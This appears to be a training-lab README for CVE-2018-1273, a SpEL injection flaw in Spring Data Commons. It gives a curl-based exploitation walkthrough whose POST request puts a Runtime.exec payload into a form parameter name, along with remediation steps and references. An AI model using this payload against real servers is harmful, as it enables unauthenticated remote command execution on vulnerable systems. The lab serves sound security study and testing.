# Spring Data Commons Property Path SpEL Remote Code Execution (CVE-2018-1273)

## Overview

Spring Data Commons versions prior to 2.0.6 contain a remote code execution vulnerability caused by unsafe property path evaluation. When binding user-submitted HTTP parameters to domain entity properties, Spring Data attempts to resolve property path expressions using SpEL. Submitting property path names containing SpEL expressions allows remote unauthenticated attackers to execute arbitrary commands.

- **Service Access**: `http://localhost:8152/`
- **Default Credentials**: `Unauthenticated`
- **Docker Shortcut**: `./lab start spring-data-commons-rce`
- **Container Name**: `cyberlab_04_spring_data_commons_rce`
- **RAM Footprint**: ~450M

---

## Exploitation Walkthrough

### 1. Inspect Registration Form Endpoint

```bash
curl -i http://localhost:8152/users
```

### 2. Submit POST Request with SpEL Parameter Name

```bash
curl -i -X POST 'http://localhost:8152/users' \
  -d 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/pwned_spring_data")]=test&password=test'
```

### 3. Verify File Creation

```bash
docker exec -it cyberlab_04_spring_data_commons_rce ls -la /tmp/pwned_spring_data
```

---

## Defensive Remediation & Hardening

1. Upgrade Spring Data Commons to version 2.0.6 or 1.13.11 or newer.
2. Disable dynamic property path expression parsing for untrusted user input.

---

## Video Walkthroughs & Technical References

- [#spring cloud gateway remote code execution | CVE-2022-22947](https://www.youtube.com/watch?v=mX3MtC6psJA)
- [Spring Security Advisory CVE-2018-1273](https://spring.io/security/cve-2018-1273)
- [Vulhub Spring Data Commons Environment](https://vulhub.org/#/environments/spring/CVE-2018-1273/)
